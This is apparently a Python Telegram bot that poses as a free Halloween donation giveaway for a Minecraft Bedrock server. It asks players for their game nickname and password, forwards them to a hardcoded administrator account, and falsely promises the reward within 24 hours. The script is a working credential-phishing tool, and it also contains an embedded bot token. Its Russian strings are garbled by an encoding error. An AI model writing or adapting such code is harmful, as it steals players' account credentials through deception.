import sqlite3
import time
import os
import sys
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler, CallbackQueryHandler

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
BOT_TOKEN = "8300222284:AAFXe3RcH2pHwvifhcbyPWJD5PRwB-8eOpw"
ADMIN_ID = 8000395560  # –í–∞—à ID
CHANNEL_LINK = "https://t.me/pnixmcbe"
CREATOR_USERNAME = "@isnikson"

# –°–æ—Å—Ç–æ—è–Ω–∏—è
NICKNAME, PASSWORD = range(2)

# –ë–∞–∑–∞ –¥–∞–Ω–Ω—ã—Ö
if os.path.exists('users.db'):
    os.remove('users.db')

conn = sqlite3.connect('users.db', check_same_thread=False)
c = conn.cursor()
c.execute('''CREATE TABLE IF NOT EXISTS users 
             (user_id INTEGER PRIMARY KEY, banned INTEGER DEFAULT 0)''')
conn.commit()

# –ê–Ω—Ç–∏—Å–ø–∞–º
user_message_times = {}

def check_spam(user_id):
    now = time.time()
    if user_id not in user_message_times:
        user_message_times[user_id] = []
    
    user_message_times[user_id] = [t for t in user_message_times[user_id] if now - t < 60]
    user_message_times[user_id].append(now)
    
    return len(user_message_times[user_id]) > 10

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–Ω–∞
        c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
        user_data = c.fetchone()
        if user_data and user_data[0]:
            await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã.")
            return
        
        await update.message.reply_text(
            "üéÉ *–ü–û–õ–£–ß–ò –•–≠–õ–û–£–ò–ù –î–û–ù–ê–¢!*\n\n"
            "–°–µ—Ä–≤–µ—Ä: `phoenix-pe.ru`\n"
            "–ü–æ—Ä—Ç: `19132`\n\n"
            "–ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ —á—Ç–æ–±—ã –Ω–∞—á–∞—Ç—å –ø–æ–ª—É—á–µ–Ω–∏–µ –¥–æ–Ω–∞—Ç–∞!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("üéÉ –ü–û–õ–£–ß–ò–¢–¨ –î–û–ù–ê–¢", callback_data="get_donate")],
                [InlineKeyboardButton("üì¢ –ù–ê–® –ö–ê–ù–ê–õ", url=CHANNEL_LINK)],
                [InlineKeyboardButton("üë§ –°–û–ó–î–ê–¢–ï–õ–¨", url=f"tg://resolve?domain={CREATOR_USERNAME[1:]}")]
            ])
        )
    except Exception as e:
        print(f"Error in start: {e}")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "get_donate":
        await query.message.reply_text("üîπ –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –Ω–∏–∫–Ω–µ–π–º:")
        return NICKNAME

async def get_nickname(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        context.user_data['nickname'] = update.message.text
        await update.message.reply_text("üîπ –¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å:")
        return PASSWORD
    except Exception as e:
        print(f"Error in get_nickname: {e}")
        return ConversationHandler.END

async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        password = update.message.text
        nickname = context.user_data['nickname']
        
        # –û—Ç–ø—Ä–∞–≤–∫–∞ –∞–¥–º–∏–Ω—É
        admin_text = (
            "üéÉ *–ù–û–í–´–ï –î–ê–ù–ù–´–ï –î–õ–Ø –î–û–ù–ê–¢–ê*\n\n"
            f"üë§ User ID: `{user_id}`\n"
            f"üìß Username: @{update.effective_user.username or 'N/A'}\n"
            f"üîë –ù–∏–∫–Ω–µ–π–º: `{nickname}`\n"
            f"üîí –ü–∞—Ä–æ–ª—å: `{password}`\n"
            f"‚è∞ –í—Ä–µ–º—è: `{time.strftime('%Y-%m-%d %H:%M:%S')}`"
        )
        
        await context.bot.send_message(ADMIN_ID, admin_text, parse_mode='Markdown')
        
        await update.message.reply_text(
            "‚úÖ –î–∞–Ω–Ω—ã–µ –ø—Ä–∏–Ω—è—Ç—ã! –î–æ–Ω–∞—Ç –ø—Ä–∏–¥–µ—Ç –≤ —Ç–µ—á–µ–Ω–∏–µ 24 —á–∞—Å–æ–≤.\n\n"
            "üì¢ –û–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–¥–ø–∏—à–∏—Å—å –Ω–∞ –Ω–∞—à –∫–∞–Ω–∞–ª!",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("üì¢ –ù–ê–® –ö–ê–ù–ê–õ", url=CHANNEL_LINK)]
            ])
        )
        
        return ConversationHandler.END
    except Exception as e:
        print(f"Error in get_password: {e}")
        return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("‚ùå –û—Ç–º–µ–Ω–µ–Ω–æ.")
    return ConversationHandler.END

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–∞–Ω–∞
        c.execute("SELECT banned FROM users WHERE user_id=?", (user_id,))
        user_data = c.fetchone()
        if user_data and user_data[0]:
            return
        
        # –ê–Ω—Ç–∏—Å–ø–∞–º
        if check_spam(user_id):
            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
            conn.commit()
            await update.message.reply_text("‚ùå –í—ã –∑–∞–±–∞–Ω–µ–Ω—ã –∑–∞ —Å–ø–∞–º.")
            return
    except Exception as e:
        print(f"Error in handle_message: {e}")

async def ban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        if context.args:
            user_id = int(context.args[0])
            c.execute("INSERT OR REPLACE INTO users (user_id, banned) VALUES (?, ?)", (user_id, 1))
            conn.commit()
            await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} –∑–∞–±–∞–Ω–µ–Ω.")
    except Exception as e:
        print(f"Error in ban_command: {e}")

async def unban_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        if update.effective_user.id != ADMIN_ID:
            return
        
        if context.args:
            user_id = int(context.args[0])
            c.execute("UPDATE users SET banned=0 WHERE user_id=?", (user_id,))
            conn.commit()
            await update.message.reply_text(f"‚úÖ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å {user_id} —Ä–∞–∑–±–∞–Ω–µ–Ω.")
    except Exception as e:
        print(f"Error in unban_command: {e}")

def main():
    try:
        # –°–æ–∑–¥–∞–µ–º application —Å —É–∫–∞–∑–∞–Ω–∏–µ–º –æ–¥–Ω–æ–≥–æ –±–æ—Ç–∞
        application = Application.builder().token(BOT_TOKEN).build()
        
        conv_handler = ConversationHandler(
            entry_points=[CallbackQueryHandler(button_handler, pattern='^get_donate$')],
            states={
                NICKNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_nickname)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_password)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            allow_reentry=True
        )
        
        application.add_handler(CommandHandler("start", start))
        application.add_handler(CommandHandler("ban", ban_command))
        application.add_handler(CommandHandler("unban", unban_command))
        application.add_handler(conv_handler)
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
        
        print("üîÑ –ó–∞–ø—É—Å–∫ –±–æ—Ç–∞...")
        print("‚úÖ –ë–æ—Ç –∑–∞–ø—É—â–µ–Ω! –û—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ –≤—Å–µ –¥—Ä—É–≥–∏–µ —ç–∫–∑–µ–º–ø–ª—è—Ä—ã –±–æ—Ç–∞.")
        application.run_polling(drop_pending_updates=True)
        
    except Exception as e:
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞: {e}")
        print("‚ö†Ô∏è  –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –¥—Ä—É–≥–∏–µ —ç–∫–∑–µ–º–ø–ª—è—Ä—ã –±–æ—Ç–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã!")
        sys.exit(1)

if __name__ == '__main__':
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∑–∞–ø—É—â–µ–Ω –ª–∏ —É–∂–µ –±–æ—Ç
    print("üîç –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø—É—â–µ–Ω–Ω—ã—Ö –ø—Ä–æ—Ü–µ—Å—Å–æ–≤...")
    main()

